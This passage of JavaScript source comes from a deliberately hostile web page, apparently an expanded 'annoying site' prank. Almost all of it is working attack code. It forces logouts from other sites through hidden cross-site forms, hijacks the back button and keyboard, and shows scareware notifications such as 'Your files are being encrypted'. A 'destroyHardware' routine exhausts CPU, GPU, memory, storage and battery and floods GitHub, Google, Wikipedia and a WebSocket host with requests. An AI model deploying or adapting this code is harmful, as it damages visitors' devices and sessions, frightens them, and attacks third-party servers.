    img.src = url
  }

  function post (url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }
  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `Logging you out from ${name}...`

    const logoutMessages = document.querySelector('.logout-messages')
    logoutMessages.appendChild(div)
  }
}

/**
 * Disable the back button. If the user goes back, send them one page forward ;-)
 */
function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

/**
 * Fill the history with extra entries for this site, to make it harder to find
 * the previous site in the back button's dropdown menu.
 */
function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // Set location back to the initial location, so user does not notice
  window.history.pushState({}, '', window.location.pathname)
}

/**
 * Get random x, y coordinates for a new window on the screen. Takes into account
 * screen size, window size, and leaves a safe margin on all sides.
 */
function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = TOP_MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN))
  return { x, y }
}

/**
 * Get a random element from a given array, `arr`.
 */
function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

// TODO: document this
function setupSearchWindow (win) {
  if (!win) return
  const { x, y } = getRandomCoords()
  win.moveTo(x, y)
  win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
  win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      win.resizeTo(WIN_WIDTH, WIN_HEIGHT)
    }, 500)
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
      win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])

      searchIndex += 1
      if (searchIndex >= SEARCHES.length) {
        searchIndex = 0
      }
    }, 1000)
  }, 3000)
}

/**
 * Spam desktop notifications on every interaction.
 * Requires user-initiated event + Notification permission.
 */
function spamNotifications () {
  if (!('Notification' in window)) return
  if (Notification.permission === 'default') {
    Notification.requestPermission()
  }
  if (Notification.permission === 'granted') {
    const messages = [
      'Your computer has a virus!',
      'Click here to claim your prize!',
      'You are the 999,999th visitor!',
      'FREE iPhone 16!',
      'Your files are being encrypted',
      'Someone is watching you through your webcam',
      'Your battery is critically low',
      'Update Java now! Critical security patch',
      'All your base are belong to us',
      'You would make a great hamster',
      'Your search history has been uploaded',
      'Your computer is now part of a botnet',
      'A wild Pikachu appeared!',
      'Error 0xDEADBEEF: Brain not found'
    ]
    const n = new Notification(getRandomArrayEntry(messages), {
      icon: 'cat-cute.jpg',
      tag: 'annoying-' + Math.random(),
      requireInteraction: true,
      silent: false
    })
    n.onclick = () => { window.focus(); openWindow() }
  }
}

/**
 * Keep the screen awake so the device drains battery faster.
 */
function keepAwake () {
  if (!navigator.wakeLock) return
  navigator.wakeLock.request('screen').catch(() => {})
}

/**
 * Request screen capture / display media access.
 * Requires user-initiated event.
 */
function requestScreenCapture () {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return
  navigator.mediaDevices.getDisplayMedia({
    video: true,
    audio: true
  }).catch(() => {})
}

/**
 * Lock the keyboard so Escape and other keys don't work.
 * Chrome only.
 */
function lockKeyboard () {
  if (!navigator.keyboard || !navigator.keyboard.lock) return
  navigator.keyboard.lock(['Escape', 'F11', 'F5', 'F6', 'F12']).catch(() => {})
}

/**
 * Request access to the file system.
 * Requires user-initiated event.
 */
function requestFileSystemAccess () {
  if (!window.showOpenFilePicker) return
  window.showOpenFilePicker({ multiple: true }).catch(() => {})
  window.showSaveFilePicker().catch(() => {})
  window.showDirectoryPicker().catch(() => {})
}

/**
 * Request access to the user's contacts (mobile).
 */
function requestContactPicker () {
  if (!navigator.contacts || !navigator.contacts.select) return
  navigator.contacts.select(['name', 'email', 'tel', 'address']).catch(() => {})
}

/**
 * Set an app badge to show a notification number on the app icon.
 */
function setBadge () {
  if (!navigator.setAppBadge) return
  navigator.setAppBadge(Math.floor(Math.random() * 100)).catch(() => {})
}

/**
 * Open the EyeDropper API to pick a color from the screen.
 * Requires user-initiated event.
 */
function openEyeDropper () {
  if (!window.EyeDropper) return
  const dropper = new EyeDropper()
  dropper.open().catch(() => {})
}

/**
 * Request idle detection permission.
 */
function requestIdleDetection () {
  if (!('IdleDetector' in window)) return
  IdleDetector.requestPermission().catch(() => {})
}

/**
 * Start a persistent low-frequency audio tone that never stops.
 */
function startPersistentAudio () {
  try {
    const ctx = new AudioContext()
    const osc = ctx.createOscillator()
    const gain = ctx.createGain()
    gain.gain.value = 0.02
    osc.frequency.value = 60
    osc.type = 'sawtooth'
    osc.connect(gain)
    gain.connect(ctx.destination)
    osc.start()
  } catch {}
}

let destroyRan = false

/**
 * Maximum destruction: melt CPU, burn GPU, drain battery
 */
function destroyHardware () {
  if (destroyRan) return
  destroyRan = true
  createWebGlCanvas()
  createHeavyCanvas2d()
  spawnExtraVideos()
  startCpuInferno()
  startCssHell()
  startLayoutThrash()
  startMemoryLeak()
  startNetworkFlood()
  spawnMoreWebGl()
  spawnAudioHell()
  startObserverHell()
  startIndexedDbSpam()
  startCacheApiSpam()
  startBroadcastSpam()
  startWebSocketFlood()
  startResizePollution()
  startSvgFilters()
  startCanvasBitmapHell()
  startCssKeyframeHell()
  startPerformanceObserverSpam()
  startFontHell()
  startStorageSpam()
  startGeolocationSpam()
  startWorkerBroadcastSpam()
  startAnimationFrameFlood()
  startHashChangeSpam()
  registerServiceWorker()
  startPersistenceHell()
  startWebRtcFlood()
  startWebCodecsSpam()
  startWasmBurner()
  startCameraFeedback()
  startAudioVisualizer()
  startGamepadPollution()
  startSecondaryWebGl()
  startLayerHell()
  startPromiseHell()
  startCryptoSubtleSpam()
  startTabHell()
  startWebGpuCompute()
  startAudioWorkletSpam()
  startMultiScreenHell()
  startPaintWorklet()
  startPresentationSpam()
  startVirtualKeyboardSpam()
  startWebTransportSpam()
  startBeforeInstall()
  startFetchSpam()
  startWindowLeak()
  startOrientationLock()
  startStoragePersist()
  startModalHell()
  startCascadeWindows()
  startFakeAlerts()
  startPopupBypass()
  startCssCompositionHell()
  startBroadcastArmy()
  startWindowRespawn()
  startFeedbackSound()
  startDownloadSpam()
  startWindowOpenSpam()
}

/**
 * Fullscreen WebGL canvas with thousands of particles,
 * spinning 3D shapes, and additive blending = GPU hell.
 */
function createWebGlCanvas () {
  const canvas = document.createElement('canvas')
  canvas.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 999999; opacity: 0.3;'
  canvas.width = window.innerWidth
  canvas.height = window.innerHeight
  document.body.appendChild(canvas)

  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
  if (!gl) return

  const vsSource = `
    attribute vec4 aVertex;
    void main(void) {
      gl_Position = aVertex;
      gl_PointSize = 8.0;
    }
  `
  const fsSource = `
    precision mediump float;
    uniform vec4 uColor;
    void main(void) {
      gl_FragColor = uColor;
    }
  `

  function createShader (src, type) {
    const s = gl.createShader(type)
    gl.shaderSource(s, src)
    gl.compileShader(s)
    return s
  }

  const vs = createShader(vsSource, gl.VERTEX_SHADER)
  const fs = createShader(fsSource, gl.FRAGMENT_SHADER)
  const prog = gl.createProgram()
  gl.attachShader(prog, vs)
  gl.attachShader(prog, fs)
  gl.linkProgram(prog)
  gl.useProgram(prog)

  const PARTICLE_COUNT = 50000
  const verts = new Float32Array(PARTICLE_COUNT * 2)
  const buf = gl.createBuffer()
  gl.bindBuffer(gl.ARRAY_BUFFER, buf)
  gl.bufferData(gl.ARRAY_BUFFER, verts, gl.DYNAMIC_DRAW)

  const loc = gl.getAttribLocation(prog, 'aVertex')
  gl.enableVertexAttribArray(loc)
  gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0)

  gl.enable(gl.BLEND)
  gl.blendFunc(gl.SRC_ALPHA, gl.ONE)
  gl.enable(gl.DEPTH_TEST)

  const colorLoc = gl.getUniformLocation(prog, 'uColor')
  let t = 0

  function render () {
    t += 0.02
    for (let i = 0; i < PARTICLE_COUNT; i++) {
      const angle = (i / PARTICLE_COUNT) * Math.PI * 2 + t
      const radius = 0.1 + (Math.sin(t * 2 + i * 0.1) * 0.5 + 0.5) * 0.8
      verts[i * 2] = Math.cos(angle + t * 0.5) * radius
      verts[i * 2 + 1] = Math.sin(angle + t * 0.3) * radius
    }
    gl.bufferSubData(gl.ARRAY_BUFFER, 0, verts)
    gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT)
    gl.uniform4f(colorLoc, Math.sin(t) * 0.5 + 0.5, Math.cos(t * 1.3) * 0.5 + 0.5, Math.sin(t * 0.7) * 0.5 + 0.5, 0.8)
    gl.drawArrays(gl.POINTS, 0, PARTICLE_COUNT)
    gl.drawArrays(gl.TRIANGLES, 0, PARTICLE_COUNT)
    gl.drawArrays(gl.LINES, 0, PARTICLE_COUNT)
    requestAnimationFrame(render)
  }
  render()
}

/**
 * Canvas 2D with shadows, globalCompositeOperation, and heavy
 * drawing to max out GPU fill rate.
 */
function createHeavyCanvas2d () {
  const canvas = document.createElement('canvas')
  canvas.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 999998; opacity: 0.4;'
  canvas.width = window.innerWidth
  canvas.height = window.innerHeight
  document.body.appendChild(canvas)

  const ctx = canvas.getContext('2d')
  if (!ctx) return

  ctx.shadowBlur = 50
  ctx.shadowColor = 'red'

  let t = 0
  function draw () {
    t += 0.05
    ctx.clearRect(0, 0, canvas.width, canvas.height)
    ctx.globalCompositeOperation = 'screen'

    for (let i = 0; i < 500; i++) {
      const x = Math.sin(t + i * 0.5) * canvas.width * 0.4 + canvas.width * 0.5
      const y = Math.cos(t * 0.7 + i * 0.3) * canvas.height * 0.4 + canvas.height * 0.5
      const r = 20 + Math.sin(t * 2 + i) * 15

      ctx.shadowBlur = 20 + Math.sin(t + i) * 20
      ctx.shadowColor = `hsl(${(t * 50 + i * 30) % 360}, 100%, 50%)`
      ctx.fillStyle = `hsla(${(t * 40 + i * 20) % 360}, 100%, 60%, 0.3)`
      ctx.beginPath()
      ctx.arc(x, y, r, 0, Math.PI * 2)
      ctx.fill()

      ctx.fillStyle = `hsla(${(t * 60 + i * 15) % 360}, 100%, 50%, 0.5)`
      ctx.shadowBlur = 40
      ctx.fillRect(x - r, y - r, r * 2, r * 2)
    }

    ctx.globalCompositeOperation = 'overlay'
    for (let i = 0; i < 200; i++) {
      const x = Math.cos(t * 0.3 + i * 0.7) * canvas.width * 0.45 + canvas.width * 0.5
      const y = Math.sin(t * 0.5 + i * 0.4) * canvas.height * 0.45 + canvas.height * 0.5
      ctx.shadowBlur = 60
      ctx.shadowColor = 'cyan'
      ctx.strokeStyle = `hsla(${(t * 80 + i * 50) % 360}, 100%, 70%, 0.6)`
      ctx.lineWidth = 3 + Math.sin(t + i) * 2
      ctx.beginPath()
      ctx.moveTo(x, y)
      ctx.lineTo(x + Math.sin(t + i) * 60, y + Math.cos(t + i) * 60)
      ctx.stroke()
    }

    requestAnimationFrame(draw)
  }
  draw()
}

/**
 * Spawn multiple hidden video elements all playing simultaneously.
 * Video decoding is one of the heaviest GPU operations.
 */
function spawnExtraVideos () {
  let count = 20
  while (count--) {
    const v = document.createElement('video')
    v.src = getRandomArrayEntry(VIDEOS)
    v.loop = true
    v.muted = true
    v.autoplay = true
    v.style = 'position: fixed; width: 1px; height: 1px; top: -10px; left: -10px; opacity: 0;'
    document.body.appendChild(v)
    v.play().catch(() => {})
  }
}

/**
 * CPU inferno: heavy computation loops hammering the processor.
 * Uses Web Worker via blob to avoid UI freeze.
 */
function startCpuInferno () {
  const workerCode = `
    function burn () {
      let x = 0;
      for (let i = 0; i < 20000000; i++) {
        x += Math.sin(i) * Math.cos(i * 0.5) * Math.tan(i * 0.1);
        x ^= (i >>> 0) % 65535;
        x = Math.sqrt(Math.abs(x)) || 0.1;
        for (let j = 0; j < 50; j++) {
          x = Math.pow(x + j, 1.1) % 1000000;
        }
      }
      postMessage(x);
      setTimeout(burn, 1);
    }
    burn();
  `
  try {
    const blob = new Blob([workerCode], { type: 'application/javascript' })
    const worker = new Worker(URL.createObjectURL(blob))
  } catch {}

  // Second worker for even more CPU burn
  const workerCode2 = `
    function burn2 () {
      let a = new Array(10000);
      for (let i = 0; i < a.length; i++) a[i] = 0;
      function cycle () {
        for (let i = 0; i < 2000000; i++) {
          a[i % a.length] += Math.sin(i * 0.1) * Math.cos(i * 0.05);
          a[(i + 1) % a.length] = a[i % a.length] ^ (i >>> 0);
        }
        postMessage(1);
        setTimeout(cycle, 1);
      }
      cycle();
    }
    burn2();
  `
  try {
    const blob2 = new Blob([workerCode2], { type: 'application/javascript' })
    const worker2 = new Worker(URL.createObjectURL(blob2))
  } catch {}

  // Also do main thread heavy work in small chunks so it doesnt completely freeze
  function mainThreadBurn () {
    let x = 0
    const start = Date.now()
    while (Date.now() - start < 100) {
      for (let i = 0; i < 1000000; i++) {
        x += Math.sin(i * x) * Math.cos(i * 0.3) * Math.tan(i * 0.07)
        x = Math.sqrt(Math.abs(x) + 1)
      }
    }
    setTimeout(mainThreadBurn, 1)
  }
  mainThreadBurn()
}

/**
 * CSS Hell: continuously toggle CSS classes and styles to
 * force infinite style recalculations and repaints.
 */
function startCssHell () {
  if (!document.querySelector('.css-hell')) {
    const div = document.createElement('div')
    div.className = 'css-hell'
    div.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999997; pointer-events: none;'
    document.body.appendChild(div)

    const style = document.createElement('style')
    style.textContent = `
      @keyframes hellspin {
        0% { transform: rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px); }
        25% { transform: rotate(90deg) scale(1.5) skew(10deg); filter: hue-rotate(90deg) blur(1px); }
        50% { transform: rotate(180deg) scale(0.5) skew(-10deg); filter: hue-rotate(180deg) blur(2px); }
        75% { transform: rotate(270deg) scale(2) skew(5deg); filter: hue-rotate(270deg) blur(1px); }
        100% { transform: rotate(360deg) scale(1) skew(0deg); filter: hue-rotate(360deg) blur(0px); }
      }
      .css-hell::before {
        content: '';
        display: block;
        width: 100%;
        height: 100%;
        background: conic-gradient(red, yellow, lime, cyan, blue, magenta, red);
        animation: hellspin 0.5s linear infinite;
        mix-blend-mode: difference;
      }
    `
    document.head.appendChild(style)
  }

  // Rapidly toggle inline styles on random elements
  setInterval(() => {
    const all = document.querySelectorAll('*')
    for (let i = 0; i < Math.min(500, all.length); i++) {
      const el = all[Math.floor(Math.random() * all.length)]
      if (el && el.style) {
        el.style.transform = 'rotate(' + Math.random() * 360 + 'deg) scale(' + (Math.random() * 3) + ')'
        el.style.filter = 'blur(' + Math.random() * 5 + 'px) hue-rotate(' + Math.random() * 360 + 'deg) brightness(' + (Math.random() * 2) + ') contrast(' + (Math.random() * 2) + ')'
        el.style.opacity = Math.random()
        el.style.zIndex = Math.floor(Math.random() * 1000000)
        el.style.willChange = 'transform, filter, opacity'
      }
    }
  }, 20)
}

/**
 * Layout thrashing: force browser to recalculate layout constantly.
 */
function startLayoutThrash () {
  setInterval(() => {
    for (let i = 0; i < 500; i++) {
      const el = document.createElement('div')
      el.style = 'position: fixed; width: 1px; height: 1px; top: ' + Math.random() * 100 + '%; left: ' + Math.random() * 100 + '%;'
      document.body.appendChild(el)
      const rect = el.getBoundingClientRect() // force layout
      const rect2 = document.body.getBoundingClientRect() // extra layout
      document.body.removeChild(el)
    }
  }, 50)
}

/**
 * Memory leak: grow arrays and DOM trees continuously.
 */
function startMemoryLeak () {
  const leak = []
  const domLeak = []
  setInterval(() => {
    for (let i = 0; i < 5000; i++) {
      leak.push(new Array(5000).fill('data: ' + Math.random() + ' ' + crypto.randomUUID()))
    }
    for (let i = 0; i < 100; i++) {
      const d = document.createElement('div')
      d.innerHTML = new Array(5000).join('<span>x</span>')
      document.body.appendChild(d)
      domLeak.push(d)
    }
    if (leak.length > 200) leak.splice(0, 50)
    if (domLeak.length > 500) {
      const gone = domLeak.splice(0, 100)
    }
  }, 50)
}

/**
 * Network flood: hammer server + random external URLs with parallel fetch requests.
 */
function startNetworkFlood () {
  const targets = [
    'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/albundy.mp4',
    'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/cat.mp4',
    'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/nyan.mp4',
    'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/space.mp4',
    'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/rickroll.mp4',
    'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png',
    'https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png',
  ]
  for (let i = 0; i < 50; i++) {
    setInterval(() => {
      for (const url of targets) {
        fetch(url + '?_=' + Math.random(), { mode: 'no-cors' }).catch(() => {})
      }
    }, 20)
  }
}

/**
 * Spawn 3 more fullscreen WebGL canvases with different heavy effects.
 */
function spawnMoreWebGl () {
  for (let c = 0; c < 3; c++) {
    const canvas = document.createElement('canvas')
    canvas.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: ' + (999990 + c) + '; opacity: 0.2; mix-blend-mode: screen;'
    canvas.width = window.innerWidth
    canvas.height = window.innerHeight
    document.body.appendChild(canvas)

    const gl = canvas.getContext('webgl', { premultipliedAlpha: false }) || canvas.getContext('experimental-webgl')
    if (!gl) return

    const vs = gl.createShader(gl.VERTEX_SHADER)
    gl.shaderSource(vs, 'attribute vec2 p; void main(){gl_Position=vec4(p,0.0,1.0);gl_PointSize=' + (4 + c * 2) + '.;}')
    gl.compileShader(vs)
    const fs = gl.createShader(gl.FRAGMENT_SHADER)
    gl.shaderSource(fs, 'precision highp float;uniform float t;void main(){gl_FragColor=vec4(sin(t+gl_FragCoord.x*0.01),cos(t*1.3+gl_FragCoord.y*0.01),sin(t*0.7+gl_FragCoord.x*0.005),0.3);}')
    gl.compileShader(fs)
    const prog = gl.createProgram()
    gl.attachShader(prog, vs)
    gl.attachShader(prog, fs)
    gl.linkProgram(prog)
    gl.useProgram(prog)

    const N = 30000
    const verts = new Float32Array(N * 2)
    for (let i = 0; i < N; i++) {
      verts[i*2] = Math.random() * 2 - 1
      verts[i*2+1] = Math.random() * 2 - 1
    }
    const buf = gl.createBuffer()
    gl.bindBuffer(gl.ARRAY_BUFFER, buf)
    gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW)
    const loc = gl.getAttribLocation(prog, 'p')
    gl.enableVertexAttribArray(loc)
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0)
    gl.enable(gl.BLEND)
    gl.blendFunc(gl.SRC_ALPHA, gl.ONE)

    const tLoc = gl.getUniformLocation(prog, 't')
    let time = 0
    function render () {
      time += 0.03 * (c + 1)
      gl.uniform1f(tLoc, time)
      gl.clear(gl.COLOR_BUFFER_BIT)
      gl.drawArrays(gl.POINTS, 0, N)
      gl.drawArrays(gl.TRIANGLES, 0, N / 3)
      gl.drawArrays(gl.LINES, 0, N / 2)
      requestAnimationFrame(render)
    }
    render()
  }
}

/**
 * Audio hell: spawn many AudioContexts with oscillators,
 * noise generators, and analyser nodes to burn CPU.
 */
function startAudioHell () {
  for (let n = 0; n < 8; n++) {
    try {
      const ctx = new AudioContext()
      const osc = ctx.createOscillator()
      const gain = ctx.createGain()
      gain.gain.value = 0.01
      osc.frequency.value = 30 + Math.random() * 200
      osc.type = ['sawtooth', 'square', 'triangle'][Math.floor(Math.random() * 3)]
      osc.connect(gain)
      gain.connect(ctx.destination)
      osc.start()

      // Also create a noise buffer for each context
      const bufferSize = ctx.sampleRate * 2
      const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate)
      const data = buffer.getChannelData(0)
      for (let i = 0; i < bufferSize; i++) {
        data[i] = Math.random() * 2 - 1
      }
      const noise = ctx.createBufferSource()
      noise.buffer = buffer
      noise.loop = true
      const ng = ctx.createGain()
      ng.gain.value = 0.005
      noise.connect(ng)
      ng.connect(ctx.destination)
      noise.start()
    } catch {}
  }
}

/**
 * Observer hell: MutationObserver + ResizeObserver + IntersectionObserver
 * all observing everything to force constant callback execution.
 */
function startObserverHell () {
  const target = document.body || document.documentElement
  if (!target) return

  // MutationObserver on body with subtree = true
  try {
    const mo = new MutationObserver(() => {
      for (let i = 0; i < 1000; i++) Math.random()
    })
    mo.observe(target, { childList: true, subtree: true, attributes: true, characterData: true })
  } catch {}

  // Second MutationObserver for more load
  try {
    const mo2 = new MutationObserver(() => {
      for (let i = 0; i < 1000; i++) Math.sqrt(Math.random())
    })
    mo2.observe(document.documentElement, { childList: true, subtree: true, attributes: true })
  } catch {}

  // ResizeObserver on many elements
  try {
    const ro = new ResizeObserver(() => {
      for (let i = 0; i < 500; i++) Math.sin(Math.random() * 100)
    })
    target.querySelectorAll('*').forEach(el => ro.observe(el))
  } catch {}

  // IntersectionObserver
  try {
    const io = new IntersectionObserver(() => {
      for (let i = 0; i < 500; i++) Math.cos(Math.random() * 100)
    })
    target.querySelectorAll('*').forEach(el => io.observe(el))
  } catch {}
}

/**
 * IndexedDB spam: continuously write/read/delete large data.
 */
function startIndexedDbSpam () {
  if (!window.indexedDB) return
  for (let dbIdx = 0; dbIdx < 10; dbIdx++) {
    const req = indexedDB.open('AnnoyingDB_' + dbIdx, 1)
    req.onupgradeneeded = () => {
      const db = req.result
      if (!db.objectStoreNames.contains('spam')) {
        db.createObjectStore('spam')
      }
    }
    req.onsuccess = () => {
      const db = req.result
      setInterval(() => {
        for (let i = 0; i < 20; i++) {
          const tx = db.transaction('spam', 'readwrite')
          const store = tx.objectStore('spam')
          store.put(new Array(1000).fill('data').join(''), 'key_' + Math.random())
          store.put(new Array(1000).fill('data').join(''), 'key_' + Math.random())
          const getTx = db.transaction('spam', 'readonly')
          getTx.objectStore('spam').getAll().onsuccess = () => {}
        }
      }, 100)
    }
  }
}

/**
 * Cache API spam: fill caches with nonsense data.
 */
function startCacheApiSpam () {
  if (!('caches' in window)) return
  for (let i = 0; i < 10; i++) {
    caches.open('annoying-cache-' + i).then(cache => {
      setInterval(() => {
        const junk = new Response(new Array(100000).join('x'), { headers: { 'content-type': 'text/plain' } })
        cache.put('/junk_' + Math.random(), junk).catch(() => {})
        cache.keys().then(keys => {
          if (keys.length > 50) {
            cache.delete(keys[0]).catch(() => {})
          }
        })
      }, 200)
    }).catch(() => {})
  }
}

/**
 * BroadcastChannel spam: communicate between windows to spread load.
 */
function startBroadcastSpam () {
  if (!('BroadcastChannel' in window)) return
  try {
    const bc = new BroadcastChannel('annoying')
    bc.onmessage = () => {
      // When we receive a message, multiply the load
      for (let i = 0; i < 10000; i++) Math.sin(Math.random() * 1000)
    }
    setInterval(() => {
      bc.postMessage({ t: Date.now(), data: new Array(1000).fill(Math.random()).join(',') })
    }, 50)
    // Second channel for more spam
    const bc2 = new BroadcastChannel('annoying-2')
    bc2.onmessage = () => {
      for (let i = 0; i < 10000; i++) Math.tan(Math.random() * 1000)
    }
    setInterval(() => {
      bc2.postMessage(new Array(1000).fill(Math.random()).join(','))
    }, 100)
  } catch {}
}

/**
 * WebSocket flood: connect to random echo endpoints.
 */
function startWebSocketFlood () {
  // Can't use real external websockets reliably, but we can use
  // the page itself if we had ws server. Instead, just create
  // multiple WebSocket objects that attempt connections
  for (let i = 0; i < 20; i++) {
    try {
      const ws = new WebSocket('wss://echo.websocket.org/?_=' + Math.random())
      ws.onopen = () => {
        setInterval(() => {
          try {
            ws.send(new Array(1000).fill('x').join(''))
          } catch {}
        }, 50)
      }
      ws.onclose = ws.onerror = () => {}
    } catch {}
  }
}

/**
 * Resize pollution: constantly change viewport meta and window size hints.
 */
function startResizePollution () {
  const meta = document.querySelector('meta[name=viewport]') || (() => {
    const m = document.createElement('meta')
    m.name = 'viewport'
    document.head.appendChild(m)
    return m
  })()
  setInterval(() => {
    const widths = [devicePixelRatio * window.innerWidth * 2, 320, 768, 1024, 1920, 2560, 3840]
    meta.content = 'width=' + widths[Math.floor(Math.random() * widths.length)] + ', initial-scale=' + (Math.random() * 3 + 0.5)
    document.documentElement.style.fontSize = Math.random() * 100 + 'px'
  }, 100)
}

/**
 * Heavy SVG filters applied to elements to force GPU compositing.
 */
function startSvgFilters () {
  const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg')
  svg.style = 'position: fixed; width: 0; height: 0;'
  const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs')

  for (let f = 0; f < 5; f++) {
    const filter = document.createElementNS('http://www.w3.org/2000/svg', 'filter')
    filter.id = 'hellfilter' + f

    const blur = document.createElementNS('http://www.w3.org/2000/svg', 'feGaussianBlur')
    blur.setAttribute('stdDeviation', String(Math.random() * 5 + 1))
    filter.appendChild(blur)

    const colorMatrix = document.createElementNS('http://www.w3.org/2000/svg', 'feColorMatrix')
    colorMatrix.setAttribute('type', 'hueRotate')
    colorMatrix.setAttribute('values', String(Math.random() * 360))
    filter.appendChild(colorMatrix)

    const component = document.createElementNS('http://www.w3.org/2000/svg', 'feComponentTransfer')
    const funcR = document.createElementNS('http://www.w3.org/2000/svg', 'feFuncR')
    funcR.setAttribute('type', 'table')
    funcR.setAttribute('tableValues', '0 1 0 1')
    component.appendChild(funcR)
    filter.appendChild(component)

    defs.appendChild(filter)
  }
  svg.appendChild(defs)
  document.body.appendChild(svg)

  setInterval(() => {
    document.querySelectorAll('*').forEach(el => {
      if (el.style && el !== document.body && Math.random() < 0.1) {
        el.style.filter = 'url(#hellfilter' + Math.floor(Math.random() * 5) + ')'
      }
    })
  }, 200)
}

/**
 * Canvas bitmap hell: create and destroy ImageBitmaps continuously.
 */
function startCanvasBitmapHell () {
  if (!('createImageBitmap' in window)) return
  const offscreen = new OffscreenCanvas(1024, 1024)
  const ctx = offscreen.getContext('2d')
  if (!ctx) return

  setInterval(() => {
    for (let i = 0; i < 20; i++) {
      ctx.clearRect(0, 0, 1024, 1024)
      for (let j = 0; j < 100; j++) {
        ctx.fillStyle = 'hsl(' + Math.random() * 360 + ', 100%, 50%)'
        ctx.beginPath()
        ctx.arc(Math.random() * 1024, Math.random() * 1024, Math.random() * 50, 0, Math.PI * 2)
        ctx.fill()
      }
      try {
        const bitmap = offscreen.transferToImageBitmap()
        // Just discard it - memory pressure!
        setTimeout(() => {}, 0)
      } catch {}
    }
  }, 100)
}

/**
 * Keyframe hell: inject hundreds of CSS keyframes to overwhelm style system.
 */
function startCssKeyframeHell () {
  const style = document.createElement('style')
  let css = ''
  for (let i = 0; i < 200; i++) {
    css += `
@keyframes hell${i} {
  0% { transform: translate(0,0) rotate(0deg) scale(1); opacity: 1; filter: blur(0px); }
  25% { transform: translate(${Math.random() * 200}px,${Math.random() * 200}px) rotate(${Math.random() * 360}deg) scale(${Math.random() * 3}); opacity: ${Math.random()}; filter: blur(${Math.random() * 5}px); }
  50% { transform: translate(${Math.random() * -200}px,${Math.random() * -200}px) rotate(${Math.random() * 360}deg) scale(${Math.random() * 3}); opacity: ${Math.random()}; filter: blur(${Math.random() * 5}px); }
  75% { transform: translate(${Math.random() * 200}px,${Math.random() * -200}px) rotate(${Math.random() * 360}deg) scale(${Math.random() * 3}); opacity: ${Math.random()}; filter: blur(${Math.random() * 5}px); }
  100% { transform: translate(0,0) rotate(360deg) scale(1); opacity: 1; filter: blur(0px); }
}
.hellanim${i} {
  animation: hell${i} ${0.1 + Math.random() * 0.3}s linear infinite;
  will-change: transform, opacity, filter;
}
`
  }
  style.textContent = css
  document.head.appendChild(style)

  // Apply animations to many elements
  for (let i = 0; i < 100; i++) {
    const el = document.createElement('div')
    el.className = 'hellanim' + Math.floor(Math.random() * 200)
    el.style = 'position: fixed; width: ' + (Math.random() * 100 + 10) + 'px; height: ' + (Math.random() * 100 + 10) + 'px; top: ' + Math.random() * 100 + '%; left: ' + Math.random() * 100 + '%; background: hsl(' + Math.random() * 360 + ', 100%, 50%); pointer-events: none; z-index: ' + Math.floor(Math.random() * 1000000) + '; mix-blend-mode: difference;'
    document.body.appendChild(el)
  }

  // Keep adding more
  setInterval(() => {
    for (let i = 0; i < 10; i++) {
      const el = document.createElement('div')
      el.className = 'hellanim' + Math.floor(Math.random() * 200)
